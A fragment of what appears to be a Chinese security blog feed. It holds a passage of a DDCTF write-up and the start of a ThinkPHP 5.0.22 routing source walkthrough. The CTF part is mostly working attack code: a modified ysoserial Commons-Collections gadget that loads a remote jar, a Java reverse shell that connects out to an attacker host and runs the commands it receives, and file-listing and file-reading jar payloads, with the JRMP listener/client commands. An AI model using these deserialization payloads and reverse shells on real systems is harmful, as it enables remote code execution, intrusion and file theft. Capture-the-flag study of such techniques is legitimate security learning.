ObjID，也就是用到了ObjID这个类，而这个类也在serialkiller的过滤列表中。但是发过去后，并未拦截这个类。。有大佬的解释是这个不是需要反序列化的类，是bind服务的时候用的。但不是很理解，有懂得大佬求讲解下。。</strong></p><p>继续我们的利用。他说了不能exec，那先试试ysoserial的URLDNS。<br><img src="https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBSVObfN16XXG331ictGcpPGcJU392jE3QJknVgDWhO8PAPMZ222AEqiagZzKNMuaq6DHTorxpOnXDVg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""></p><p>成功接收。</p><p>继续，尝试执行命令。<br><img src="https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBSVObfN16XXG331ictGcpPGcvdV3hwWN7OCzSvR9ib1QibvxSKHLD4j1bF025bQxsF73RXHG60YIBdww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""></p><p>收不到。。。</p><p>继续看代码，用到了Common-collection3.1。是否能改一下让他任意代码执行呢？</p><p>尝试重写Common-collection3的功能，使任意代码执行然后下载一个直接弹shell的jar。<br>现有的payload是通过反射来执行命令的，想改exp很麻烦。。这里参考下iswin大佬的文章。<br><img src="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" alt="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/"></p><p>感谢<strong>@threedr3am</strong>)<a href="https://threedr3am.github.io/" target="_blank" rel="noopener">@threedr3am</a> 大佬的帮助，膜爆师傅。。tql<br>贴一下魔改过的一些代码 <strong>(By threedr3am)</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import ysoserial.payloads.util.PayloadRunner;</span><br><span class="line">import ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line">public class CommonsCollectionsForLoadJar extends PayloadRunner implements ObjectPayload&lt;BadAttributeValueExpException&gt; &#123;</span><br><span class="line">public BadAttributeValueExpException getObject(String ipAndHost) throws Exception &#123;</span><br><span class="line">    String payloadUrl = ipAndHost.substring(0, ipAndHost.indexOf(&quot;;&quot;));</span><br><span class="line">    String ip2 = ipAndHost.substring(ipAndHost.indexOf(&quot;;&quot;) + 1,   ipAndHost.lastIndexOf(&quot;:&quot;));</span><br><span class="line">    String str = ipAndHost;</span><br><span class="line">    Integer port2 = Integer.valueOf(Integer.parseInt(str.substring(ipAndHost.lastIndexOf(&quot;:&quot;) + 1)));</span><br><span class="line">    Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(Integer.valueOf(1))&#125;);</span><br><span class="line">    Transformer[] transformers = new Transformer[7];</span><br><span class="line">    Class[] clsArr = new Class[]&#123;Class[].class&#125;;</span><br><span class="line">    Object[] objArr = new Object[1];</span><br><span class="line">    objArr[0] = new Class[]&#123;URL[].class&#125;;</span><br><span class="line">    transformers[1] = new InvokerTransformer(&quot;getConstructor&quot;, clsArr, objArr);</span><br><span class="line">    clsArr = new Class[]&#123;Object[].class&#125;;</span><br><span class="line">    objArr = new Object[1];</span><br><span class="line">    Object[] objArr2 = new Object[1];</span><br><span class="line">    objArr2[0] = new URL[]&#123;new URL(payloadUrl)&#125;;</span><br><span class="line">    objArr[0] = objArr2;</span><br><span class="line">    transformers[2] = new InvokerTransformer(&quot;newInstance&quot;, clsArr, objArr);</span><br><span class="line">    transformers[3] = new InvokerTransformer(&quot;loadClass&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;R&quot;&#125;);</span><br><span class="line">    clsArr = new Class[]&#123;Class[].class&#125;;</span><br><span class="line">    objArr = new Object[1];</span><br><span class="line">    objArr[0] = new Class[]&#123;String.class, Integer.class&#125;;</span><br><span class="line">    transformers[4] = new InvokerTransformer(&quot;getConstructor&quot;, clsArr, objArr);</span><br><span class="line">    clsArr = new Class[]&#123;Object[].class&#125;;</span><br><span class="line">    objArr = new Object[1];</span><br><span class="line">    objArr[0] = new Object[]&#123;ip2, port2&#125;;</span><br><span class="line">    transformers[5] = new InvokerTransformer(&quot;newInstance&quot;, clsArr, objArr);</span><br><span class="line">    transformers[6] = new ConstantTransformer(Integer.valueOf(1));</span><br><span class="line">    TiedMapEntry entry = new TiedMapEntry(LazyMap.decorate(new HashMap(), transformerChain), &quot;foo&quot;);</span><br><span class="line">    BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br><span class="line">    Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">    valfield.setAccessible(true);</span><br><span class="line">    valfield.set(val, entry);</span><br><span class="line">    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span><br><span class="line">    return val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Constructor&lt;?&gt; getFirstCtor(String name) throws Exception &#123;</span><br><span class="line">    Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];</span><br><span class="line">    ctor.setAccessible(true);</span><br><span class="line">    return ctor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Field getField(Class&lt;?&gt; clazz, String fieldName) throws Exception &#123;</span><br><span class="line">    Field field = clazz.getDeclaredField(fieldName);</span><br><span class="line">    if (field == null &amp;&amp; clazz.getSuperclass() != null) &#123;</span><br><span class="line">        field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">    &#125;</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">        return field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        getField(obj.getClass(), fieldName).set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>R.java:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class R &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public R(String ip, Integer port) &#123;</span><br><span class="line">        new Thread(() -&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket socket = new Socket(ip,port);</span><br><span class="line">                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</span><br><span class="line">                bufferedWriter.write(&quot;hello ddctf!&quot;);</span><br><span class="line">                bufferedWriter.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                BufferedReader bufferedReader = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(socket.getInputStream()));</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line = bufferedReader.readLine()) == null)</span><br><span class="line">                        ;</span><br><span class="line">                    Process pro = Runtime.getRuntime().exec(line);</span><br><span class="line">                    BufferedReader read = new BufferedReader(</span><br><span class="line">                        new InputStreamReader(pro.getInputStream()));</span><br><span class="line">                    String line2 = null;</span><br><span class="line">                    while ((line2 = read.readLine()) != null) &#123;</span><br><span class="line">                        bufferedWriter.write(line2);</span><br><span class="line">                        bufferedWriter.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>然后加到ysoserial里，常规的JRMPClient方式起一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 44446 CommonsCollectionsForLoadJar &apos;http://ip/R.jar;nc_vps:nc_port&apos;</span><br><span class="line"></span><br><span class="line">//生成注入client来访问这个server的payload，常规利用方式。</span><br><span class="line">java -jar ysoserial.jar JRMPClient1 &apos;vpsIP:44446&apos;|base64 &gt; payloadd</span><br></pre></td></tr></table></figure></p><p>本地nc listen一下，/api/nicaibudao_hahaxxxx/deserial?base64Info=payload 发过去，就能弹shell回来。执行命令果然失败。看来命令都被禁了</p><p><img src="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" alt=""></p><p>果然失败。看来shell都被禁了</p><p>虽然没办法执行命令，但我们可以用jar实现一个java的文件目录读写的file shell。然后同样姿势发过去，就能列目录、读文件了。</p><p>listDir.java:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">public class R &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public R(String ip, Integer port) &#123;</span><br><span class="line">        new Thread(() -&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket socket = new Socket(ip,port);</span><br><span class="line">                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</span><br><span class="line">                bufferedWriter.write(&quot;hello ddctf!&quot;);</span><br><span class="line">                bufferedWriter.newLine();</span><br><span class="line">                bufferedWriter.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                BufferedReader bufferedReader = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(socket.getInputStream()));</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line = bufferedReader.readLine()) == null)</span><br><span class="line">                        ;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        v(line.trim(),bufferedWriter);</span><br><span class="line">                    &#125; catch (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        bufferedWriter.write(&quot;11&quot;);</span><br><span class="line">                        bufferedWriter.newLine();</span><br><span class="line">                    &#125;</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private void v(String dddir,BufferedWriter bufferedWriter) throws IOException &#123;</span><br><span class="line">        Files.walkFileTree(Paths.get(dddir), new SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public FileVisitResult postVisitDirectory(Path dir, IOException exc) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    bufferedWriter.write(dir.toString());</span><br><span class="line">                    bufferedWriter.newLine();</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                return FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    bufferedWriter.write(file.toString());</span><br><span class="line">                    bufferedWriter.newLine();</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                return FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>readFile.java:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class R &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public R(String ip, Integer port) &#123;</span><br><span class="line">        new Thread(() -&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket socket = new Socket(ip,port);</span><br><span class="line">                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));</span><br><span class="line">                bufferedWriter.write(&quot;hello ddctf!&quot;);</span><br><span class="line">                bufferedWriter.newLine();</span><br><span class="line">                bufferedWriter.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                BufferedReader bufferedReader = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(socket.getInputStream()));</span><br><span class="line">                while (true) &#123;</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line = bufferedReader.readLine()) == null)</span><br><span class="line">                        ;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        BufferedReader read = new BufferedReader(</span><br><span class="line">                            new InputStreamReader(Files.newInputStream(Paths.get(line.trim()))));</span><br><span class="line">                        String line2 = null;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        while ((line2 = read.readLine()) != null) &#123;</span><br><span class="line">                            bufferedWriter.write(line2);</span><br><span class="line">                            bufferedWriter.newLine();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        bufferedWriter.write(&quot;11&quot;);</span><br><span class="line">                        bufferedWriter.newLine();</span><br><span class="line">                    &#125;</span><br><span class="line">                    bufferedWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>本地nc listen一下，/api/nicaibudao_hahaxxxx/deserial?base64Info=payload 发过去，就能列目录。发现/flag目录下有flag文件，再重新谈一个能读的shell，读一下拿到flag。<br><img src="https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBSVObfN16XXG331ictGcpPGcWOhWibDibrWYiauqohtKyibB8E71CeiaictpU5of7FYasDWNfSDGd34yMgLQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""></p><p>再次感谢threedr3am师傅带我赛后做出这道题。。伏地膜</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;访问题目，抓包看到几个api。&lt;br&gt;account_info返回{“id”:1,”roleAdmin”:false}&lt;br&gt;gen_token返回token&lt;/p&gt;
&lt;p&gt;token解b64有：PadOracle:iv/cbc &lt;/p&gt;
&lt;p&gt;基本确定就是padding oracle然后cbc字节翻转。&lt;/p&gt;
&lt;p&gt;大体复习下padding oracle原理，0-16字节是16-32密文的iv，16-32的密文是32-48密文的iv，&lt;br&gt;我们要改32-48的密文，得先爆破出它的middle，即用16-32的密文去爆破，最后得到middle，然后和16-32字节的密文xor，也即是32-48的iv &lt;/p&gt;
&lt;p&gt;去复习了一波，找到脚本跑一下。&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://love-sg.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>TP是如何Run起来的</title>
    <link href="http://love-sg.me/2019/02/23/TP%E6%98%AF%E5%A6%82%E4%BD%95Run%E8%B5%B7%E6%9D%A5%E7%9A%84/"/>
    <id>http://love-sg.me/2019/02/23/TP是如何Run起来的/</id>
    <published>2019-02-22T18:13:13.000Z</published>
    <updated>2019-04-25T15:02:05.113Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近TP爆了三个的RCE，我也对漏洞进行了分析，跟了相应的源码。这几个洞一个是任意方法调用造成的，另一个本质是请求中<code>filter</code>可控，而tp的会对输入即input进行<code>filter</code>过滤造成的。分析洞不难，但是分析中我对TP的dispatch路由调度以及TP的整个运行过程并不是很清楚，因此就有了这篇文章。</p><p><strong>TP版本：5.0.22</strong></p><p>从官网Down到TP源码，首先看start.php里这一句：App::run()-&gt;send(); 跟进App类的run方法</p><p>首先<code>$request</code>是一个<code>Request::instance()</code>，进去看一下最后就是<code>self::$instance = new static($options);</code>这个操作，也就是返回了Request类的实例。</p><p>说下new static这个操作也是第一次见。。之前只见过new self()，这里贴一段代码就明白两者区别了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_self</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">self</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_static</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">static</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> get_class(B::get_self()); <span class="comment">// A</span></span><br><span class="line"><span class="keyword">echo</span> get_class(B::get_static()); <span class="comment">// B</span></span><br><span class="line"><span class="keyword">echo</span> get_class(A::get_static()); <span class="comment">// A</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>回到源码，接下来通过<code>self::initCommon()</code>方法把文件convention.php的配置读到了$config数组中。<br>接下来会进行模块绑定的处理，首先检查App的属性bind，是否绑定到特定模块/控制器。如果App的属性bind没有设置，则读取配置的<code>auto_bind_module</code>。如果设置了自动绑定模块，则将入口文件名绑定为模块名称。</p><p>这里不重要，接着往下，调用了<code>$request-&gt;filter($config[&#39;default_filter&#39;]);</code>来将config中的过滤器绑定到request对象中。5.0.22里这个值默认是空的。</p><p>跳过下面几行，到了<code>Hook::listen(&#39;app_dispatch&#39;, self::$dispatch);</code>这里，调用app_dispatch的回调函数。<br>TP中的钩子实际就是行为拓展。这里引用一下摘来的一段对行为的理解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">行为（Behavior）是一个比较抽象的概念，你可以想象成在应用执行过程中的一个动作或者处理，在框架的执行流程中，各个位置都可以有行为产生，例如路由检测是一个行为，静态缓存是一个行为，用户权限检测也是行为，大到业务逻辑，小到浏览器检测、多语言检测等等都可以当做是一个行为，甚至说你希望给你的网站用户的第一次访问弹出Hello，world！这些都可以看成是一种行为，行为的存在让你无需改动框架和应用，而在外围通过扩展或者配置来改变或者增加一些功能。</span><br><span class="line"></span><br><span class="line">而不同的行为之间也具有位置共同性，比如，有些行为的作用位置都是在应用执行前，有些行为都是在模板输出之后，我们把这些行为发生作用的位置称之为标签（位）(tag)，当应用程序运行到这个标签的时候，就会被拦截下来，统一执行相关的行为</span><br></pre></td></tr></table></figure></p><p>在TP的application目录中的tags.php中能看到已经定义的hook，当我们要自定义hook时，需要先add注册，再在需要用的地方listen。但是tp里貌似并没有对这几个内置的钩子的功能进行实现。</p><p>再继续看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取应用调度信息</span></span><br><span class="line">$dispatch = <span class="keyword">self</span>::$dispatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">    $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>dispatch获取应用的调度信息，这里的routeCheck()是路由解析的入口，跟进看一下。（tp的几个rce分析过程中也都牵扯到了这个方法）</p><p>开始这句<code>$path = $request-&gt;path();</code>继续跟进，最终会到pathinfo()方法，他会根据URL中是通过兼容模式s还是CLI模式来访问返回给path进行路由解析过的值。注意tp5中，url模式已经被取消，只能采用兼容普通强制三种模式。</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-fc17cb5b94f9f2cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="路由模式"></p><p>接下来判断该请求是否进行过路由检测，路由解析过后会将结果$result返回给$dispatch。下面是访问/index/index时，$dispatch中的值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [type] =&gt; module</span><br><span class="line">    [module] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; index</span><br><span class="line">            [<span class="number">1</span>] =&gt; index</span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="keyword">null</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>回到run方法，下一行<code>$request-&gt;dispatch($dispatch);</code>将解析的调度信息保存到全局Request对象中。<br>略过下面几行，直接到<code>$data = self::exec($dispatch, $config);</code>，跟进exec方法看一下。</p><p>第一行，根据<code>$dispatch[&#39;type&#39;]</code>进行不同的应用的调度。应用调度应该算是tp启动中一个核心过程。<br>这里跟进看下module部分，他根据请求加载对应module及文件。</p><p>首先module方法会检测是多模块还是单模块，tp5默认是开启多模块的。下面的一段操作主要会绑定一个module，然后进行module的初始化。跟进init方法，大致读一下，主要作用是加载了模块的配置信息等。</p><p>继续回到module，往下看到获取了控制器名以及绑定到request对象中，并通过<code>$instance = Loader::controller</code>来返回一个控制器实例。继续往下到了调用控制器操作的部分。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">      <span class="comment">// 执行操作方法</span></span><br><span class="line">      $call = [$instance, $action];</span><br><span class="line">      <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">      $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">      $methodName = $reflect-&gt;getName();</span><br><span class="line">      $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">      $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">      $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">      <span class="comment">// 空操作</span></span><br><span class="line">      $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">      $vars = [$actionName];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 操作不存在</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">  <span 